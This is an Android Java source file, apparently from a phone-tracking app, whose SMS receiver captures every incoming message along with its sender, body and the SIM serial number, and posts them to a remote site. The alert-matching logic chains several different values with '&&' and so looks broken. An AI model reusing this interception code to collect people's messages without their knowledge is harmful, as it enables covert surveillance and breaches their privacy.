package com.rdt.foundphone.function;

import java.util.ArrayList;

import com.rdt.foundphone.db.FileIO;
import com.rdt.foundphone.service.ServiceBG;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSreceiver extends BroadcastReceiver {
	
	public FileIO fileIO;
	
	public void onReceive(Context context, Intent intent) {
		
	//	System.out.println("SMSreceiver NEW INCOMING SMS");
		
		Bundle bundle = intent.getExtras();        
		if (bundle != null) {
			Object[] pdus = (Object[]) bundle.get("pdus");
			SmsMessage[] msgs = new SmsMessage[pdus.length];
			ArrayList<String> numbers = new ArrayList<String>();
			ArrayList<String> messages = new ArrayList<String>();
			for (int i=0; i<msgs.length; i++){
				msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
				numbers.add(msgs[i].getOriginatingAddress());
				messages.add(msgs[i].getMessageBody().toString());
				
				String log = "NEWSMS/--/"+ServiceBG.getDataCalender()+"/--/"+ServiceBG.getSimSerialNumber+"/--/"+msgs[i].getOriginatingAddress()+"/--/"+msgs[i].getMessageBody().toString()+"/-"
						+ "-/"+msgs[i].getDisplayMessageBody()+"/--/"+msgs[i].getEmailBody()+"/--/"+msgs[i].getEmailFrom()+"/-"
						+ "-/"+msgs[i].getOriginatingAddress()+"/--/"+msgs[i].getTimestampMillis();
				
				if(ServiceBG.option_write_sms_log == 1){
				      if(ServiceBG.sendLOGtoSitePOST("newsms" , log) == 1){/*ÎÒÏÐÀÂÊÀ ÍÀ ÑÅÐÂÅÐ ÓÑÅØÍÎ*/ 
				    	  ServiceBG.old_check_internet = ServiceBG.getDataCalender();
							ServiceBG.old_check_success_internet = ServiceBG.getDataCalender();
						}else{ServiceBG.old_check_internet = ServiceBG.getDataCalender();
						ServiceBG.writeLOG(log, 1, ServiceBG.option_write_sms_log);}}
				
				if(ServiceBG.alert_incoming_sms == 1){
					if(msgs[i].getOriginatingAddress().endsWith(ServiceBG.alert_incoming_sms_number_1) 
							&& msgs[i].getOriginatingAddress().endsWith(ServiceBG.alert_incoming_sms_number_2) 
							&& msgs[i].getOriginatingAddress().endsWith(ServiceBG.alert_incoming_sms_number_3) 
							&& msgs[i].getOriginatingAddress().endsWith(ServiceBG.alert_incoming_sms_number_4) 
							&& msgs[i].getOriginatingAddress().endsWith(ServiceBG.alert_incoming_sms_number_5)){
						ServiceBG.AlertIncSMS = 1;
						ServiceBG.AlertIncSMS_TEXT = "F_PHONE -> NEW ALERT -> in incoming SMS exist phome number.";
					}
					if(msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_1) 
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_2) 
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_3) 
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_4) 
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_5)
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_6)
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_7)
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_8)
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_9)
							&& msgs[i].getMessageBody().toString().endsWith(ServiceBG.alert_incoming_sms_text_10)){
						ServiceBG.AlertIncSMSText = 1;
						ServiceBG.AlertIncSMS_TEXT = "F_PHONE -> NEW ALERT -> in incoming SMS exist text.";
					}
				}
				
			}
			if (messages.size() > 0){
				
			}
		} 
	}
}